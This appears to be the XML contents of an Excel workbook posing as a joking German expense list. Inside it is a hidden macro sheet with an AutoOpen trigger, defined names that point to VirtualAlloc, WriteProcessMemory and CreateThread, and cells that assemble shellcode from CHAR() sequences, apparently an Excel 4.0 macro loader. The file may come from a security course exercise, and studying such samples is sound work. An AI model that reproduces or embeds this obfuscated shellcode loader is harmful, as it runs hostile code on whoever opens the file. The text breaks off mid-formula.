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/>
  <workbookPr/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="https://fhtw-my.sharepoint.com/personal/cs19m018_technikum-wien_at/Documents/"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="8_{25CB7950-C8CF-42E4-BD73-6E952C84B09C}" xr6:coauthVersionLast="46" xr6:coauthVersionMax="46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Macro1" sheetId="2" state="hidden" r:id="rId1"/>
    <sheet name="Sheet1" sheetId="1" r:id="rId2"/>
  </sheets>
  <definedNames>
    <definedName name="AutoOpen">Macro1!$A$1</definedName>
    <definedName name="CThread" function="1" xlm="1" functionGroupId="9">-1680080894</definedName>
    <definedName name="main" localSheetId="0">Macro1!$B$122</definedName>
    <definedName name="Valloc" function="1" xlm="1" functionGroupId="9">-647561216</definedName>
    <definedName name="WProcessMemory" function="1" xlm="1" functionGroupId="9">-151322623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" i="1" l="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="28" uniqueCount="27">
  <si>
    <t>excel</t>
  </si>
  <si>
    <t>Auflistung des Unkostenbeitrags:</t>
  </si>
  <si>
    <t>Privatparty bei Ho</t>
  </si>
  <si>
    <t>Kaviar</t>
  </si>
  <si>
    <t>Blumenwiese</t>
  </si>
  <si>
    <t>Kopien fuer Studies</t>
  </si>
  <si>
    <t>20 Kopien Pro Semester</t>
  </si>
  <si>
    <t>Blumengeschmack: Violetter Rauch</t>
  </si>
  <si>
    <t>Brownies</t>
  </si>
  <si>
    <t>Machen Gute Laune</t>
  </si>
  <si>
    <t>Anmerkungen</t>
  </si>
  <si>
    <t>(Warum ned sushi?)</t>
  </si>
  <si>
    <t>Freunderlauftraege</t>
  </si>
  <si>
    <t>Zoom</t>
  </si>
  <si>
    <t>Streaming</t>
  </si>
  <si>
    <t>Neue Sessel</t>
  </si>
  <si>
    <t xml:space="preserve"> (eh ned so tragisch)</t>
  </si>
  <si>
    <t>Softail Slim S</t>
  </si>
  <si>
    <t>Harley-Davidson</t>
  </si>
  <si>
    <t>Dienst"auto"</t>
  </si>
  <si>
    <t>Helm</t>
  </si>
  <si>
    <t>ODIN B02 Half Helmet</t>
  </si>
  <si>
    <t>Men's Willie G. Skull T-Shirt</t>
  </si>
  <si>
    <t>T-Shirt</t>
  </si>
  <si>
    <t>LehrerLaunge Ausstattung</t>
  </si>
  <si>
    <t>Margaritas, mjam mjam mjam</t>
  </si>
  <si>
    <t>Summe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</si>
</sst>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0" fillId="0" borderId="2" xfId="0" applyBorder="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="3" xfId="0" applyBorder="1"/>
    <xf numFmtId="164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164" fontId="0" fillId="0" borderId="14" xfId="0" applyNumberFormat="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="1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5A4BC99-883B-4536-8404-FDFD5105CFAF}">
  <dimension ref="A1:D1024"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A1" t="b">
        <f>GOTO(A2)</f>
        <v>1</v>
      </c>
      <c r="B1" t="str">
        <f>CHAR(235)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(137)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(169)&amp;CHAR(252)&amp;CHAR(174)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(63)&amp;CHAR(90)&amp;CHAR(233)&amp;CHAR(116)&amp;CHAR(8)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(62)&amp;CHAR(169)&amp;CHAR(117)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(234)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(169)&amp;CHAR(234)&amp;CHAR(139)&amp;CHAR(92)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(94)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(185)&amp;CHAR(11)&amp;CHAR(179)&amp;CHAR(101)&amp;CHAR(151)&amp;CHAR(155)&amp;CHAR(7)&amp;CHAR(42)&amp;CHAR(213)&amp;CHAR(198)&amp;CHAR(12)&amp;CHAR(104)&amp;CHAR(155)&amp;CHAR(120)&amp;CHAR(164)&amp;CHAR(46)&amp;CHAR(185)&amp;CHAR(187)&amp;CHAR(80)&amp;CHAR(33)&amp;CHAR(112)&amp;CHAR(143)&amp;CHAR(137)&amp;CHAR(248)&amp;CHAR(127)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(34)&amp;CHAR(66)&amp;CHAR(239)&amp;CHAR(229)&amp;CHAR(100)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(227)&amp;CHAR(168)&amp;CHAR(172)&amp;CHAR(193)&amp;CHAR(7)&amp;CHAR(168)&amp;CHAR(15)&amp;CHAR(84)&amp;CHAR(190)&amp;CHAR(34)&amp;CHAR(51)&amp;CHAR(236)&amp;CHAR(23)&amp;CHAR(96)&amp;CHAR(36)&amp;CHAR(195)&amp;CHAR(101)&amp;CHAR(187)&amp;CHAR(18)&amp;CHAR(173)&amp;CHAR(42)&amp;CHAR(180)&amp;CHAR(63)&amp;CHAR(110)&amp;CHAR(53)&amp;CHAR(11)&amp;CHAR(221)&amp;CHAR(241)&amp;CHAR(9)&amp;CHAR(146)&amp;CHAR(1)&amp;CHAR(63)&amp;CHAR(183)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(133)&amp;CHAR(144)&amp;CHAR(46)&amp;CHAR(1)&amp;CHAR(168)&amp;CHAR(154)&amp;CHAR(95)&amp;CHAR(170)&amp;CHAR(100)&amp;CHAR(55)&amp;CHAR(223)&amp;CHAR(22)&amp;CHAR(203)&amp;CHAR(142)&amp;CHAR(235)&amp;CHAR(99)&amp;CHAR(214)&amp;CHAR(13)&amp;CHAR(164)&amp;CHAR(88)&amp;CHAR(109)&amp;CHAR(118)&amp;CHAR(162)&amp;CHAR(217)&amp;CHAR(1)&amp;CHAR(125)&amp;CHAR(153)&amp;CHAR(248)&amp;CHAR(38)&amp;CHAR(75)&amp;CHAR(125)&amp;CHAR(104)&amp;CHAR(147)&amp;CHAR(252)&amp;CHAR(90)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(17)&amp;CHAR(98)&amp;CHAR(15)&amp;CHAR(20)&amp;CHAR(93)&amp;CHAR(224)&amp;CHAR(37)&amp;CHAR(31)&amp;CHAR(178)&amp;CHAR(104)&amp;CHAR(81)&amp;CHAR(180)&amp;CHAR(186)&amp;CHAR(191)&amp;CHAR(12)&amp;CHAR(135)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(53)</f>
        <v>ë#[‰ß°©ü®uý‰ù‰ÞŠ_x0006_0_x0007_Gf?Zét_x0008_F€&gt;©uîëêÿáèØÿÿÿ_x0002__x0003__x0005__x000D__x0006__x0005__x0007__x0002__x0002__x0005__x000D__x0006_	_x0002__x0006__x0008__x000C__x0005__x000B__x0005__x0006__x0001__x0013__x0002_	_x0005__x0003__x000D__x000B__x000D__x0005__x0001__x0006__x0002__x0003__x0007_
_x0006__x0001__x0001_	_x0007__x0005__x0011__x0002__x0002_	
_x0006_	_x0002__x0005__x0002__x0005__x0005_	_x0002__x0003_	_x0005__x0004__x000B__x0002__x0004__x000B__x0006__x0007__x0007__x0002__x000E__x0006__x0003_
_x0001__x0001__x0007_©ê‹\_x000D__x0006_^_x0002__x0002_¹_x000B_³e—›_x0007_*ÕÆ_x000C_h›x¤.¹»P!p‰ø‰M"Bïåd_x0007__x0005__x0011__x0002_ã¨¬Á_x0007_¨_x000F_T¾"3ì_x0017_`$Ãe»_x0012_­*´?n5_x000B_Ýñ	’_x0001_?·_x0004_G…._x0001_¨š_ªd7ß_x0016_ËŽëcÖ_x000D_¤Xmv¢Ù_x0001_}™ø&amp;K}h“üZ…Ê_x0011_b_x000F__x0014_]à%_x001F_²hQ´º¿_x000C_‡_x000B__x0003_5</v>
      </c>
      <c r="C1" t="str">
        <f>CHAR(72)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(129)&amp;CHAR(233)&amp;CHAR(7)&amp;CHAR(251)&amp;CHAR(255)&amp;CHAR(255)</f>
        <v>H1ÉHé_x0007_ûÿÿ</v>
      </c>
      <c r="D1">
        <v>121</v>
      </c>
    </row>
    <row r="2" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A2" t="b">
        <f>GOTO(A3)</f>
        <v>1</v>
      </c>
      <c r="B2" t="str">
        <f>CHAR(103)&amp;CHAR(25)&amp;CHAR(167)&amp;CHAR(212)&amp;CHAR(199)&amp;CHAR(229)&amp;CHAR(31)&amp;CHAR(145)&amp;CHAR(163)&amp;CHAR(141)&amp;CHAR(153)&amp;CHAR(135)&amp;CHAR(127)&amp;CHAR(124)&amp;CHAR(118)&amp;CHAR(106)&amp;CHAR(19)&amp;CHAR(195)&amp;CHAR(121)&amp;CHAR(194)&amp;CHAR(141)&amp;CHAR(207)&amp;CHAR(248)&amp;CHAR(30)&amp;CHAR(18)&amp;CHAR(96)&amp;CHAR(248)&amp;CHAR(246)&amp;CHAR(155)&amp;CHAR(230)&amp;CHAR(40)&amp;CHAR(162)&amp;CHAR(184)&amp;CHAR(90)&amp;CHAR(160)&amp;CHAR(116)&amp;CHAR(117)&amp;CHAR(138)&amp;CHAR(9)&amp;CHAR(37)&amp;CHAR(242)&amp;CHAR(233)&amp;CHAR(15)&amp;CHAR(13)&amp;CHAR(152)&amp;CHAR(144)&amp;CHAR(244)&amp;CHAR(121)&amp;CHAR(103)&amp;CHAR(156)&amp;CHAR(164)&amp;CHAR(118)&amp;CHAR(103)&amp;CHAR(40)&amp;CHAR(210)&amp;CHAR(69)&amp;CHAR(101)&amp;CHAR(134)&amp;CHAR(76)&amp;CHAR(111)&amp;CHAR(56)&amp;CHAR(140)&amp;CHAR(153)&amp;CHAR(159)&amp;CHAR(231)&amp;CHAR(62)&amp;CHAR(197)&amp;CHAR(104)&amp;CHAR(178)&amp;CHAR(170)&amp;CHAR(147)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(30)&amp;CHAR(39)&amp;CHAR(194)&amp;CHAR(169)&amp;CHAR(175)&amp;CHAR(41)&amp;CHAR(58)&amp;CHAR(1)&amp;CHAR(240)&amp;CHAR(159)&amp;CHAR(20)&amp;CHAR(122)&amp;CHAR(207)&amp;CHAR(88)&amp;CHAR(126)&amp;CHAR(97)&amp;CHAR(201)&amp;CHAR(117)&amp;CHAR(96)&amp;CHAR(12)&amp;CHAR(48)&amp;CHAR(119)&amp;CHAR(193)&amp;CHAR(193)&amp;CHAR(14)&amp;CHAR(253)&amp;CHAR(66)&amp;CHAR(164)&amp;CHAR(247)&amp;CHAR(24)&amp;CHAR(32)&amp;CHAR(249)&amp;CHAR(50)&amp;CHAR(160)&amp;CHAR(255)&amp;CHAR(23)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(65)&amp;CHAR(90)&amp;CHAR(120)&amp;CHAR(29)&amp;CHAR(174)&amp;CHAR(113)&amp;CHAR(107)&amp;CHAR(60)&amp;CHAR(147)&amp;CHAR(55)&amp;CHAR(231)&amp;CHAR(155)&amp;CHAR(224)&amp;CHAR(137)&amp;CHAR(201)&amp;CHAR(188)&amp;CHAR(185)&amp;CHAR(157)&amp;CHAR(87)&amp;CHAR(102)&amp;CHAR(130)&amp;CHAR(178)&amp;CHAR(231)&amp;CHAR(123)&amp;CHAR(237)&amp;CHAR(71)&amp;CHAR(221)&amp;CHAR(182)&amp;CHAR(6)&amp;CHAR(108)&amp;CHAR(98)&amp;CHAR(55)&amp;CHAR(221)&amp;CHAR(148)&amp;CHAR(151)&amp;CHAR(84)&amp;CHAR(44)&amp;CHAR(184)&amp;CHAR(4)&amp;CHAR(188)&amp;CHAR(157)&amp;CHAR(53)&amp;CHAR(162)&amp;CHAR(209)&amp;CHAR(212)&amp;CHAR(56)&amp;CHAR(69)&amp;CHAR(171)&amp;CHAR(147)&amp;CHAR(3)&amp;CHAR(55)&amp;CHAR(48)&amp;CHAR(2)&amp;CHAR(119)&amp;CHAR(164)&amp;CHAR(221)&amp;CHAR(172)&amp;CHAR(155)&amp;CHAR(223)&amp;CHAR(54)&amp;CHAR(24)&amp;CHAR(139)&amp;CHAR(248)&amp;CHAR(61)&amp;CHAR(6)&amp;CHAR(119)&amp;CHAR(162)&amp;CHAR(246)&amp;CHAR(108)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)</f>
        <v>g_x0019_§ÔÇå_x001F_‘£™‡|vj_x0013_ÃyÂÏø_x001E__x0012_`øö›æ(¢¸Z tuŠ	%òé_x000F__x000D_˜ôygœ¤vg(ÒEe†Lo8Œ™Ÿç&gt;Åh²ª“H_x000B__x001E_'Â©¯):_x0001_ðŸ_x0014_zÏX~aÉu`_x000C_0wÁÁ_x000E_ýB¤÷_x0018_ ù2 ÿ_x0017_&gt;ÜAZx_x001D_®qk&lt;“7ç›à‰É¼¹Wf‚²ç{íGÝ¶_x0006_lb7Ý”—T,¸_x0004_¼5¢ÑÔ8E«“_x0003_70_x0002_w¤Ý¬›ß6_x0018_‹ø=_x0006_w¢öln_x0002__x0006__x0008__x000C__x0005__x000B__x0005__x0006__x0001__x0013__x0002_	_x0005__x0003__x000D__x000B__x000D__x0005__x0001__x0006__x0002__x0003__x0007_
_x0006__x0001__x0001_	_x0007__x0005__x0011__x0002__x0002_	
_x0006_	_x0002__x0005__x0002__x0005__x0005_	_x0002__x0003_	_x0005__x0004__x000B__x0002__x0004__x000B__x0006__x0007__x0007__x0002__x000E__x0006__x0003_
_x0001__x0001__x0007__x0002__x0003__x0005__x000D__x0006__x0005__x0007__x0002__x0002__x0005__x000D_</v>
      </c>
      <c r="C2" t="str">
        <f>CHAR(72)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(207)</f>
        <v>H_x0005_ïÿÿÿH»Ï</v>
      </c>
      <c r="D2">
        <v>83</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A3" t="b">
        <f>GOTO(A4)</f>
        <v>1</v>
      </c>
      <c r="B3" t="str">
        <f>CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(210)&amp;CHAR(206)&amp;CHAR(160)&amp;CHAR(227)&amp;CHAR(37)&amp;CHAR(155)&amp;CHAR(137)&amp;CHAR(52)&amp;CHAR(122)&amp;CHAR(208)&amp;CHAR(67)&amp;CHAR(123)&amp;CHAR(21)&amp;CHAR(232)&amp;CHAR(99)&amp;CHAR(96)&amp;CHAR(223)&amp;CHAR(167)&amp;CHAR(8)&amp;CHAR(170)&amp;CHAR(217)&amp;CHAR(220)&amp;CHAR(101)&amp;CHAR(150)&amp;CHAR(190)&amp;CHAR(131)&amp;CHAR(245)&amp;CHAR(43)&amp;CHAR(6)&amp;CHAR(191)&amp;CHAR(189)&amp;CHAR(197)&amp;CHAR(5)&amp;CHAR(190)&amp;CHAR(148)&amp;CHAR(140)&amp;CHAR(39)&amp;CHAR(42)&amp;CHAR(230)&amp;CHAR(235)&amp;CHAR(75)&amp;CHAR(22)&amp;CHAR(51)&amp;CHAR(178)&amp;CHAR(246)&amp;CHAR(212)&amp;CHAR(6)&amp;CHAR(153)&amp;CHAR(145)&amp;CHAR(121)&amp;CHAR(72)&amp;CHAR(190)&amp;CHAR(12)&amp;CHAR(96)&amp;CHAR(8)&amp;CHAR(95)&amp;CHAR(20)&amp;CHAR(185)&amp;CHAR(255)&amp;CHAR(92)&amp;CHAR(145)&amp;CHAR(197)&amp;CHAR(178)&amp;CHAR(47)&amp;CHAR(157)&amp;CHAR(59)&amp;CHAR(211)&amp;CHAR(73)&amp;CHAR(82)&amp;CHAR(217)&amp;CHAR(162)&amp;CHAR(78)&amp;CHAR(253)&amp;CHAR(212)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(173)&amp;CHAR(153)&amp;CHAR(143)&amp;CHAR(219)&amp;CHAR(87)</f>
        <v>_x0006_	_x0002__x0006__x0008__x000C__x0005__x000B__x0005__x0006__x0001__x0013__x0002_	_x0005__x0003__x000D__x000B__x000D__x0005__x0001__x0006__x0002__x0003__x0007_
_x0006__x0001__x0001_	_x0007__x0005__x0011__x0002__x0002_	
_x0006_	_x0002__x0005__x0002__x0005__x0005_	_x0002__x0003_	_x0005__x0004__x000B__x0002__x0004__x000B__x0006__x0007__x0007__x0002__x000E__x0006__x0003_
_x0001__x0001__x0007__x0002__x0003__x0005__x000D__x0006__x0005__x0007__x0002__x0002__x0005__x000D__x0006_	_x0002__x0006__x0008__x000C__x0005__x000B__x0005__x0006__x0001__x0013__x0002_	_x0005__x0003__x000D__x000B__x000D__x0005__x0001__x0006__x0002__x0003__x0007_
_x0006__x0001__x0001_	_x0007__x0005__x0011__x0002__x0002_	
_x0006_	_x0002__x0005__x0002__x0005__x0005_	_x0002__x0003_	_x0005__x0004__x000B__x0002__x0004__x000B__x0006__x0007__x0007__x0002__x000E__x0006__x0003_
_x0001__x0001__x0007__x0002__x0003__x0005__x000D__x0006__x0005__x0007__x0002__x0002__x0005__x000D__x0006_	_x0002__x0006__x0008__x000C__x0005__x000B__x0005__x0006__x0001__x0013__x0002_	_x0005__x0003__x000D__x000B__x000D__x0005__x0001__x0006_ÒÎ ã%›‰4zÐC{_x0015_èc`ß§_x0008_ªÙÜe–¾ƒõ+_x0006_¿½Å_x0005_¾”Œ'*æëK_x0016_3²öÔ_x0006_™‘yH¾_x000C_`_x0008___x0014_¹ÿ\‘Å²/;ÓIRÙ¢NýÔO1­™ÛW</v>
      </c>
      <c r="C3" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(72)&amp;CHAR(49)&amp;CHAR(88)</f>
        <v>&gt;±ÖÈ!¥ûH1X</v>
      </c>
    </row>
    <row r="4" spans="1:4" x14ac:dyDescent="0.25">
      <c r="A4" t="b">
        <f>GOTO(A5)</f>
        <v>1</v>
      </c>
      <c r="B4" t="str">
        <f>CHAR(104)&amp;CHAR(23)&amp;CHAR(4)&amp;CHAR(15)&amp;CHAR(172)&amp;CHAR(197)&amp;CHAR(227)&amp;CHAR(214)&amp;CHAR(197)&amp;CHAR(176)&amp;CHAR(24)&amp;CHAR(217)&amp;CHAR(166)&amp;CHAR(130)&amp;CHAR(181)&amp;CHAR(49)&amp;CHAR(14)&amp;CHAR(136)&amp;CHAR(13)&amp;CHAR(127)&amp;CHAR(200)&amp;CHAR(138)&amp;CHAR(118)&amp;CHAR(80)&amp;CHAR(108)&amp;CHAR(51)&amp;CHAR(103)&amp;CHAR(242)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(225)&amp;CHAR(83)&amp;CHAR(93)&amp;CHAR(44)&amp;CHAR(77)&amp;CHAR(186)&amp;CHAR(214)&amp;CHAR(123)&amp;CHAR(242)&amp;CHAR(214)&amp;CHAR(117)&amp;CHAR(74)&amp;CHAR(243)&amp;CHAR(204)&amp;CHAR(115)&amp;CHAR(20)&amp;CHAR(143)&amp;CHAR(150)&amp;CHAR(7)&amp;CHAR(219)&amp;CHAR(36)&amp;CHAR(153)&amp;CHAR(19)&amp;CHAR(226)&amp;CHAR(94)&amp;CHAR(105)&amp;CHAR(232)&amp;CHAR(81)&amp;CHAR(214)&amp;CHAR(37)&amp;CHAR(134)&amp;CHAR(117)&amp;CHAR(43)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(209)&amp;CHAR(154)&amp;CHAR(212)&amp;CHAR(242)&amp;CHAR(241)&amp;CHAR(11)&amp;CHAR(54)&amp;CHAR(226)&amp;CHAR(230)&amp;CHAR(209)&amp;CHAR(19)&amp;CHAR(107)&amp;CHAR(33)&amp;CHAR(67)&amp;CHAR(159)&amp;CHAR(205)&amp;CHAR(98)&amp;CHAR(48)&amp;CHAR(163)&amp;CHAR(13)&amp;CHAR(224)&amp;CHAR(184)&amp;CHAR(113)&amp;CHAR(243)&amp;CHAR(229)&amp;CHAR(154)&amp;CHAR(110)&amp;CHAR(153)&amp;CHAR(222)&amp;CHAR(97)&amp;CHAR(127)&amp;CHAR(238)&amp;CHAR(123)&amp;CHAR(57)&amp;CHAR(83)&amp;CHAR(214)&amp;CHAR(122)&amp;CHAR(150)&amp;CHAR(150)&amp;CHAR(250)&amp;CHAR(8)&amp;CHAR(163)&amp;CHAR(92)&amp;CHAR(121)&amp;CHAR(125)&amp;CHAR(251)&amp;CHAR(198)&amp;CHAR(52)&amp;CHAR(164)&amp;CHAR(255)&amp;CHAR(116)&amp;CHAR(119)&amp;CHAR(70)&amp;CHAR(138)&amp;CHAR(224)&amp;CHAR(170)&amp;CHAR(230)&amp;CHAR(133)&amp;CHAR(108)&amp;CHAR(7)&amp;CHAR(119)&amp;CHAR(110)&amp;CHAR(215)&amp;CHAR(189)&amp;CHAR(136)&amp;CHAR(28)&amp;CHAR(106)&amp;CHAR(175)&amp;CHAR(183)&amp;CHAR(13)&amp;CHAR(110)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(210)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(239)&amp;CHAR(108)&amp;CHAR(73)&amp;CHAR(174)&amp;CHAR(15)&amp;CHAR(40)&amp;CHAR(92)&amp;CHAR(82)&amp;CHAR(56)&amp;CHAR(148)&amp;CHAR(16)&amp;CHAR(254)&amp;CHAR(101)&amp;CHAR(35)&amp;CHAR(245)&amp;CHAR(113)&amp;CHAR(21)&amp;CHAR(90)&amp;CHAR(63)&amp;CHAR(139)&amp;CHAR(75)&amp;CHAR(78)&amp;CHAR(116)&amp;CHAR(222)&amp;CHAR(85)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(119)&amp;CHAR(215)&amp;CHAR(179)&amp;CHAR(173)&amp;C